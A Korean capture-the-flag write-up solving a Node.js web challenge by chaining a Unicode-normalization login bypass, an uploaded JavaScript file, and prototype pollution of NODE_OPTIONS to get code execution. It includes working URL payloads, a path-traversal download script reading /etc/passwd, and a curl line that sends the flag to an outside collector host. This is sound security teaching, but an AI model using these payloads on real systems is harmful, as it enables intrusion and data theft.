# Keyword 
- Prototype Pollution
- Unicode Normalization
- LFI
- RCE
- 환경변수

---
# Write-Up 

### 0. 분석
- `/debug` 엔드포인트를 보면, `korea_pocas`의 `JWT`를 확인하고 맞다면 `child_process.spawnSync()`를 이용하여, 서브프로세스를 생성하고 `debug.js`를 실행시킴
- `process.execPath`에는 현재 `node`의 경로가 들어가게 됨
- `debug.js`에는 특별한 건 없고 `console.log()`로 `Debug mode on`이라는 텍스트를 출력해줌
- 결과를 `stdout.toString()`를 통해 브라우저 화면 상에서 출력함
```js
app.get('/debug', function(req, res){
    const cook = req.cookies['user'];
    if (cook !== undefined){
        try{
            const information = jwt.verify(cook, SECRET);
            if (information['user'] == 'korea_pocas'){
                res.send(spawnSync(process.execPath, ['debug.js']).stdout.toString());
            } else {
                res.send("Debug mode off");
            }
        } catch (e) {
            res.status(401).json({ error: 'unauthorized' });
        }
    } else {
        try{
            res.send("You are not login..")
        } catch (e) {
            res.send("I don't know..")
        }
    }
})
```

- 자식 프로세스를 만들어서 실행시키므로 서버 동작 중 `node` 환경변수를 조작한 후 실행하게 되면, 예상치 못한 동작을 유도할 수 있음

- 파일을 업로드할 수 있는 엔드포인트가 있음 
```js
app.post('/upload', upload.single('filezz'),function(req, res){
    try{
        conn.query(mysql.format("insert into filelist(path) values (?)", req.file.path), function(err, rows){
            if(err) {res.send(err);}
            else {res.send('Upload Success : ' + req.file.path);}
        });
    } catch (e) {
        res.send("I don't know..");
    }
})
```

- `custom.js`에서 `multer`설정에서 특정 확장자만 사용할 수 있게 되어 있는데, `js`확장자에 대한 MIME 타입이 잘못 설정되어 있어서 `js`파일은 무조건 `jpg`파일로 바뀌어서 들어가게 됨
```js
const storage = multer.diskStorage({
    destination : function(req, file, cb){    
  
      cb(null, 'publics/uploads/');
    },
  
    filename : function(req, file, cb){
      var mimeType;
      var filename = file.originalname.split('.')[0];
  
      switch (file.mimetype) {
        case "image/png":
          mimeType = "png";
        break;
        case "chose/javascript":
            mimeType = "js";
        break
        default:
          mimeType = "jpg";
        break;
      } 
      cb(null, filename + "." + mimeType);
    }
  });
  
module.exports = multer({
    storage: storage
});
```

### 1. 로그인 우회
- `/register` 엔드포인트를 확인해 보면, `korea_pocas`라는 유저에 대한 필터링이 있음
```js
app.post('/register', (req, res) => {
    const name = req.body.name;
    const id = req.body.id;
    const pw = req.body.pw;
    const rpw = req.body.rpw;

    if (/[A-Z]/g.test(id) || id == 'korea_pocas') {
        res.send("This user is not allowed.").status(400);
    }
    else{
        if(name == '' || id == '' || pw == ''){
            res.send("<script>alert('Empty values must not exist');history.go(-1);</script>");
        }
        else{
            func.getuser(mysql.format("select * from users where id = ?", id), function(err, data){
                if(err){
                    res.send(err);
                }
                else{
                  if(data){
                      res.send("<script>alert('This ID is already taken.');history.go(-1);</script>");
                  }
                 else{
                    if(pw !== rpw){
                        res.send("<script>alert('Please enter the same password');history.go(-1);</script>");
                    }
                    else{
                        const params = [name.toLowerCase(), id.toLowerCase(), func.sha256(pw.toLowerCase())];
                        conn.query(mysql.format("insert into users(name, id, pw) values(?, ?, ?);", params), function(err, rows){
                            if(err) { res.send(err);}
                            else {res.redirect("/login");}
                        });
                    }
                  }
                }
            });
        }
    }
});

```

- `id`가 `korea_pocas`라는 계정이 있으면 `/debug`에 접근 가능해지기 때문에 필터링이 존재

- 아래의 코드에서 대문자를 소문자로 바꾸는 부분이 있는데, 이때 `toLowerCase()` 함수는 정규화 과정을 거침
```js
const params = [name.toLowerCase(), id.toLowerCase(), func.sha256(pw.toLowerCase())];
```

- [Unicode Normalization Table](!https://www.unicode.org/charts/normalization/)에 있는 정보를 기반으로 K(U+212A)로 `korea_pocas`계정을 얻을 수 있음
- `Korea_pocas` 로 계정 생성 후 `korea_pocas` 로 로그인


### 2. RCE
- `/debug` 엔드포인트에서 플래그를 출력하게 만들기 위해 디버깅할 때와 동일한 방식으로 RCE코드 작성 후 `tmp.jpg` 업로드
- 위에서 `js`은 업로드가 안되므로 `jpg`로 확장자 바꿔서 넘김(하면서 알았지만 `js`로 넘겨도 결과에 차이가 없음)
```
console.log(require('child_process').spawnSync('/bin/cat', ['/app/flag']).stdout.toString());
```

- upload 경로는 `/app/publics/uploads/tmp.jpg`임


### 3. Environment Variable Manipulation with Prototype Pollution
- `/raw/:filename` 엔드포인트에서 `filename`을 url 상에서 받고 있으므로 Injection이 가능한데, 이를 이용해 `Prototype Pollution`을 사용할 수 있음
```js
app.get('/raw/:filename', function(req, res){
    const file = {};
    const filename = req.params.filename;
    const filepath = `publics/uploads/${filename}`;

    try{
        func.getfile(mysql.format("select * from filelist where path = ?", filepath), function(err, data){
            if(err) {
                res.send(err);
            }
            else{
                if (data){
                    res.download(data.path);
                }else{
                    try{
                        func.merge(file, JSON.parse(`{"filename":"${filename}", "State":"Not Found"}`));
                        res.send(file);
                    } catch (e) {
                        res.send("I don't know..");
                    }
                }
            }
        });
    } catch (e) {
        res.send("I don't know..");
    }
});
```

- [Node CLI Document](!https://nodejs.org/api/cli.html)에서 `NODE_OPTIONS`에 대한 키워드로 검색해보면 `--require` 또는 `-r` 옵션으로  특정 모듈을 `preload` 해주는 기능을 사용할 수 있다는 것을 알 수 있음

- 위의 정보와 `json`구조, `URL Encoding`에 유의하여 아래의 payload를 작성할 수 있음 
```
{"filename":"${filename}", "State":"Not Found"} 
```

```
asdf%22,%22__proto__%22:%7B%22NODE_OPTIONS%22:%22--require%20%2fapp%2fpublics%2fuploads%2ftmp.jpg%22%7D,%22asdf%22:%22asdf
```

- request
```
GET /raw/asdf%22,%22__proto__%22:%7B%22NODE_OPTIONS%22:%22--require%20%2fapp%2fpublics%2fuploads%2ftmp.jpg%22%7D,%22asdf%22:%22asdf HTTP/1.1
```
- response
```
HTTP/1.1 200 OK
{"filename":"asdf","asdf":"asdf","State":"Not Found","NODE_OPTIONS":"--require /app/publics/uploads/tmp.jpg"}
```


### 4. debug 접속
- 출력 결과를 확인하기 위해 `/debug` 엔드포인트에 접속하면 `flag`를 얻을 수 있음
```
pocas{My father(E$on Musk) is a great man of the 21st century. I loved you} Debug mode on
```


---
# 삽질..
- 다양한 삽질이 있었는데, 가장 기억에 남는 건 URL 인코딩이랑 `'`이슈였음
- `/`를 경로로 인식해서 인코딩해야한다는 사실을 몰랐고
- `node -require`의 인자는 `'`가 들어가면 안되는 것을 몰랐음..


---
# 다른 풀이
- [여기서](!https://www.irongeek.com/homoglyph-attack-generator.php)좀 더 편하게 필터링을 우회할 수 있음
```js
// 'a'==['a'] 을 이용한 뻘짓도 해봄. 실패.
function f(x){
    for(i of x)
        if(/[A-Za-z]/g.test(i) == false && 'korea_pocas'.indexOf(i.toLowerCase()) != -1)
            console.log(i);
}
f('E e È É Ê Ë é ê ë Ē ē Ĕ ĕ Ė ė Ę Ě ě Ε Е е Ꭼ Ｅ ｅ	K k Κ κ К Ꮶ ᛕ K Ｋ ｋ0 O o Ο ο О о Օ 𐐠𱠠Ｏ ｏP p Ρ ρ Р р Ꮲ Ｐ ｐS s Ѕ ѕ Տ Ⴝ Ꮪ 𐐠𵠠Ｓ ｓÄ ӒÖ Ӧ0 O o Ο ο О о Օ 𐐠𱠠Ｏ ｏ_ ＿')
// 위 문자들 출처 : https://www.irongeek.com/homoglyph-attack-generator.php
// 출력물 : K _, 성공!!
```


- Prototype Pollution을 `req.file.path`에 대해서도 할 수 있음
```python
#!/usr/bin/python3
import requests

port = 17316
s = requests.session()

def download(path):
    payload = f'''XXX", "__proto__":{{"file":{{"path":"publics%2fuploads%2f..%2f..%2f..{path.replace('/', '%2f')}"}}}}, "sth":"XXX'''
    print( s.get(f'http://host1.dreamhack.games:{port}/raw/{payload}').text )

    print( s.post(f'http://host1.dreamhack.games:{port}/upload').text )

    payload = '''%2e%2e%2f%2e%2e%2f%2e%2e''' + path.replace('/', '%2f').replace('.', '%2e')
    print( s.get(f'http://host1.dreamhack.games:{port}/raw/{payload}').text )

download('/app/Dockerfile')
download('/app/entrypoint.sh')
download('/app/custom.js')
download('/app/debug.js')
download('/app/package.json')
download('/app/userfunc.js')
download('/app/template/index.ejs')
download('/etc/passwd')
download('/app/flag') # 얘만 안 뜸!!

```

- Prototype Pollution으로 jwt 알고리즘을 우회할 수 있음
```
`jwt.sign`할 때 옵션에 `algorithm`을 주지 않아서 **prototype pollution**을 이용하면 `algorithm: 'none'`으로 덮어서 sign값 지울 수 있음. 근데 현재 jsonwebtoken 버전에서는 `jwt.verify()`할 때 위와 같은 문제를 막아놔서, 낮은 버전을 사용하거나 코드 수정이 있는 상황에 한해서 가능한 문제일 거 같음
```

- 브라우저 화면에 출력하는게 아닌 curl로 정보를 공격서버로 보내는 방식도 있
```jsx
require('child_process').execSync('curl https://rqfmjiv.request.dreamhack.games --data "data=`cat flag`"')
```